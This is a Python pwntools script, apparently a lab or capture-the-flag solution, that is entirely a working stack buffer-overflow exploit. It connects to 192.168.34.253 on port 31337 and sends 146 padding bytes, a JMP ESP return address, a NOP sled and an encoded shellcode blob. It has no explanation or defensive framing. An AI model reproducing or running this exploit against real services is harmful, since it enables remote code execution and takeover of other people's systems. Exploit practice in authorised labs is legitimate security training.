from pwn import *
# context.log_level = 'DEBUG'

r = remote('192.168.34.253', 31337)

shellcode =  b""
shellcode += b"\xb8\x29\x31\xfd\xdc\xdb\xd8\xd9\x74\x24\xf4\x5a\x2b"
shellcode += b"\xc9\xb1\x31\x31\x42\x13\x83\xea\xfc\x03\x42\x26\xd3"
shellcode += b"\x08\x20\xd0\x91\xf3\xd9\x20\xf6\x7a\x3c\x11\x36\x18"
shellcode += b"\x34\x01\x86\x6a\x18\xad\x6d\x3e\x89\x26\x03\x97\xbe"
shellcode += b"\x8f\xae\xc1\xf1\x10\x82\x32\x93\x92\xd9\x66\x73\xab"
shellcode += b"\x11\x7b\x72\xec\x4c\x76\x26\xa5\x1b\x25\xd7\xc2\x56"
shellcode += b"\xf6\x5c\x98\x77\x7e\x80\x68\x79\xaf\x17\xe3\x20\x6f"
shellcode += b"\x99\x20\x59\x26\x81\x25\x64\xf0\x3a\x9d\x12\x03\xeb"
shellcode += b"\xec\xdb\xa8\xd2\xc1\x29\xb0\x13\xe5\xd1\xc7\x6d\x16"
shellcode += b"\x6f\xd0\xa9\x65\xab\x55\x2a\xcd\x38\xcd\x96\xec\xed"
shellcode += b"\x88\x5d\xe2\x5a\xde\x3a\xe6\x5d\x33\x31\x12\xd5\xb2"
shellcode += b"\x96\x93\xad\x90\x32\xf8\x76\xb8\x63\xa4\xd9\xc5\x74"
shellcode += b"\x07\x85\x63\xfe\xa5\xd2\x19\x5d\xa3\x25\xaf\xdb\x81"
shellcode += b"\x26\xaf\xe3\xb5\x4e\x9e\x68\x5a\x08\x1f\xbb\x1f\xe6"
shellcode += b"\x55\xe6\x09\x6f\x30\x72\x08\xf2\xc3\xa8\x4e\x0b\x40"
shellcode += b"\x59\x2e\xe8\x58\x28\x2b\xb4\xde\xc0\x41\xa5\x8a\xe6"
shellcode += b"\xf6\xc6\x9e\x84\x99\x54\x42\x65\x3c\xdd\xe1\x79"

jmp_esp = p32(0x080414c3)
payload = 'A' * 146 + jmp_esp +'\x90' * 32 + shellcode

r.sendline(payload)
